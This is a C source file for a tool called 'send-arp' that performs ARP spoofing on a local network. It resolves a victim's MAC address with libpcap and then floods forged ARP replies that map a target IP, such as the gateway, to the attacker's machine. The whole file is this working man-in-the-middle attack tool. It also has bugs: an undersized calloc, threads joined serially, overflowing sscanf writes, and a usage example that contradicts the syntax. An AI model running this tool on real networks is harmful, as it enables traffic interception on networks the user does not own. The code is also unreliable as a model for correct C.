#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <memory.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <pthread.h>
#include <pcap/pcap.h>

typedef struct ifreq ifreq_t;
typedef struct pcap_pkthdr pcap_pkthdr_t;

#pragma pack(push, 1)
typedef struct {
    int16_t  sin_family;
    uint16_t sin_port;
    uint32_t sin_addr;
    int8_t   sin_zero[8];
} sockaddr_in_t;

typedef struct {
    uint8_t  destMacAddr[6],
             srcMacAddr[6];
    uint16_t etherType;
} MACheader;

typedef struct {
    uint16_t hardwareType,
             protocolType;
    uint8_t  hardwareSize,
             protocolSize;
    uint16_t opcode;
    uint8_t  senderMacAddr[6];
    uint32_t senderIpAddr;
    uint8_t  targetMacAddr[6];
    uint32_t targetIpAddr;
} ARPheader;
#pragma pack(pop)

typedef struct {
    int32_t sec;
    int8_t * interface,
           * senderIPstr,
           * targetIPstr;
} DoAttackParam, * pDoAttackParam;

int32_t   readWholeTextData  (int8_t    * fileName,  int8_t        ** pBuffer);
uint32_t  getSelfIPv4Addr    (int8_t    * interface);
uint32_t  parseIPv4Addr      (int8_t    * ipAddrStr);
int32_t   getSelfMacAddr     (int8_t    * interface, uint8_t       * out);
int32_t   makeWholeArpPacket (MACheader * macHdr,    ARPheader     * arpHdr,   uint8_t  ** outBuf, int32_t * outSize);
uint32_t checkInterfaceName  (int8_t    * interfaceName);
void     printBuffer         (int8_t    * title,     const uint8_t * buffer,   uint32_t size);
void *   doAttack            (void      * vparam);

int main(int argc, char ** argv) {
    if (argc < 5 || !(argc & 1)) {
        printf("Error: At least four command-line arguments are required.\n"
               "syntax: send-arp <time (sec)> <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n"
               "sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");

        return 1;
    }

    if (!checkInterfaceName(argv[2])) {
        printf("Error: Please refrain from entering abnormal entries.\n");

        return 1;
    }

    int status;

    int32_t       sec            = atoi(argv[1]);
    uint32_t      pthreadSize    = (argc - 3) >> 1;
    int8_t        * interface    = argv[2];
    pthread_t     * pthread      = calloc(pthreadSize, sizeof(pthread_t));
    DoAttackParam * pthreadParam = calloc(pthreadSize, sizeof(pDoAttackParam));

    for (uint32_t i = 0, argIdx = 3; i < pthreadSize; i++, argIdx++) {
        (pthreadParam + i)->sec         = sec;
        (pthreadParam + i)->interface   = interface;
        (pthreadParam + i)->senderIPstr = argv[argIdx];
        (pthreadParam + i)->targetIPstr = argv[++argIdx];

        if (pthread_create(pthread + i, NULL, doAttack, pthreadParam + i) < 0) {
            printf("[Error] Thread (senderIP : %s / targetIP : %s) creating FAILED.", 
                (pthreadParam + i)->senderIPstr, 
                (pthreadParam + i)->targetIPstr
            );
        }

        pthread_join(pthread[i], (void **)&status);
    }

    free(pthreadParam);
    free(pthread);

    return 0;
}

int32_t readWholeTextData(int8_t * fileName, int8_t ** pBuffer) {
    FILE * fp;

    if (!(fp = fopen(fileName, "rt"))) {
        return 0;
    }

    fseek(fp, 0, SEEK_END);

    uint32_t length = ftell(fp);

    if (!(*pBuffer = calloc(length + 1, 1))) {
        fclose(fp);

        return 0;
    }

    fseek(fp, 0, SEEK_SET);
    fread(*pBuffer, length, 1, fp);
    fclose(fp);

    return 1;
}

uint32_t getSelfIPv4Addr(int8_t * interface) {
    int32_t sd  = socket(AF_INET, SOCK_STREAM, 0);
    ifreq_t ifr = { .ifr_addr.sa_family = AF_INET };
    
    strcpy(ifr.ifr_name, interface);
    ioctl(sd, SIOCGIFADDR, &ifr);
    close(sd);

    return ((sockaddr_in_t *)&ifr.ifr_addr)->sin_addr;
}

uint32_t parseIPv4Addr(int8_t * ipAddrStr) {
    int8_t result[4] = { 0 };

    sscanf(ipAddrStr, "%u.%u.%u.%u", result + 0, result + 1, result + 2, result + 3);

    return *(uint32_t *)result;
}

int32_t getSelfMacAddr(int8_t * interface, uint8_t * out) {
    int8_t locationOfMacAddr[45] = { 0 };
    int8_t * tempMacAddr;

    sprintf(locationOfMacAddr, "/sys/class/net/%s/address", interface);
    
    if (!readWholeTextData(locationOfMacAddr, &tempMacAddr)) {
        return 0;
    }

    sscanf(tempMacAddr, "%x:%x:%x:%x:%x:%x", out + 0, out + 1, out + 2, out + 3, out + 4, out + 5);
    free(tempMacAddr);
            
    return 1;
}

int32_t makeWholeArpPacket(MACheader * macHdr, ARPheader * arpHdr, uint8_t ** outBuf, int32_t * outSize) {
    *outSize = sizeof *macHdr + sizeof *arpHdr;
    *outBuf  = calloc(*outSize, sizeof **outBuf);

    if (!*outBuf) return 0;

    uint8_t * bufOffset = *outBuf;

    memcpy(bufOffset += 0, macHdr, sizeof *macHdr);
    memcpy(bufOffset += sizeof *macHdr, arpHdr, sizeof *arpHdr);

    return 1;
}

uint32_t checkInterfaceName(int8_t * interfaceName) {
    int8_t * ptr = interfaceName;

    while (*ptr) {
        if (NULL 
            || *ptr == '.' 
            || *ptr == '/' 
            || *ptr == '\\') return 0;
        
        ++ptr;
    }

    return 1;
}

void printBuffer(int8_t * title, const uint8_t * buffer, uint32_t size) {
    printf("[%s]\n", title);

    for (uint32_t i = 0; i < size; i++) {
        printf("%02X ", buffer[i]);

        if (!((i + 1) % 8)) printf(" ");

        if (!((i + 1) % 16)) puts("");
    }

    if (size % 16) puts("");

    puts("");
}

void * doAttack(void * vparam) {
    uint8_t attackerMacAddr[6],
            senderMacAddr[6];

    DoAttackParam param          = *(pDoAttackParam)vparam;
    uint32_t      attackerIPAddr = getSelfIPv4Addr(param.interface),
                  senderIPAddr   = parseIPv4Addr(param.senderIPstr),
                  targetIPAddr   = parseIPv4Addr(param.targetIPstr);
    
    getSelfMacAddr(param.interface, attackerMacAddr);

    MACheader macHdr = { .etherType = htons(0x0806) };
    ARPheader arpHdr = { 
        .hardwareType = htons(0x0001), 
        .protocolType = htons(0x0800),
        .opcode       = htons(0x0001),
        .protocolSize = 4,
        .hardwareSize = 6,
        .senderIpAddr = attackerIPAddr,
        .targetIpAddr = senderIPAddr,
    };

    memset(&macHdr.destMacAddr, 0xFF, 6);
    memset(&arpHdr.targetMacAddr, 0x00, 6);
    memcpy(&macHdr.srcMacAddr, attackerMacAddr, 6);
    memcpy(&arpHdr.senderMacAddr, attackerMacAddr, 6);

    int8_t        errBuf[PCAP_ERRBUF_SIZE];
    uint8_t       * packet,
                  * buffer;
    int32_t       bufSize;
    pcap_pkthdr_t header;

    makeWholeArpPacket(&macHdr, &arpHdr, &buffer, &bufSize);
    printBuffer("Sent Packet", buffer, bufSize);

    pcap_t  * pcap      = pcap_open_live(param.interface, 0, 0, 0, errBuf),
            * pcapReply = pcap_open_live(param.interface, BUFSIZ, 1, 1000, errBuf);

    while (1) {
        const uint8_t * packet;
        pcap_pkthdr_t * header;

        pcap_sendpacket(pcap, buffer, bufSize);

        int32_t res = pcap_next_ex(pcapReply, &header, &packet);

        if (!res) continue;

        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));

            break;
        }

        printBuffer("Captured Packet", packet, header->caplen);

        if (!NULL
            && ntohs(((MACheader *)packet)->etherType) == 0x0806 
            && ntohs(((ARPheader *)(packet + sizeof(MACheader)))->opcode) == 0x0002
            && ((ARPheader *)(packet + sizeof(MACheader)))->senderIpAddr == senderIPAddr)
        {
            memcpy(senderMacAddr, ((ARPheader *)(packet + sizeof macHdr))->senderMacAddr, 6);
            
            break;
        }
    }

    macHdr = (MACheader) { .etherType = htons(0x0806) };
    arpHdr = (ARPheader) { 
        .hardwareType = htons(0x0001), 
        .protocolType = htons(0x0800),
        .opcode       = htons(0x0001),
        .protocolSize = 4,
        .hardwareSize = 6,
        .senderIpAddr = targetIPAddr,
        .targetIpAddr = senderIPAddr,
    };

    memcpy(&macHdr.destMacAddr, senderMacAddr, 6);
    memcpy(&arpHdr.targetMacAddr, senderMacAddr, 6);
    memcpy(&macHdr.srcMacAddr, attackerMacAddr, 6);
    memcpy(&arpHdr.senderMacAddr, attackerMacAddr, 6);

    free(buffer);
    makeWholeArpPacket(&macHdr, &arpHdr, &buffer, &bufSize);
    printBuffer("Sent Packet for ATTACK", buffer, bufSize);

    for (int32_t i = 0; i < param.sec; i++) {
        pcap_sendpacket(pcap, buffer, bufSize);
        sleep(1);
    }

    pcap_close(pcapReply);
    pcap_close(pcap);
    free(buffer);
}
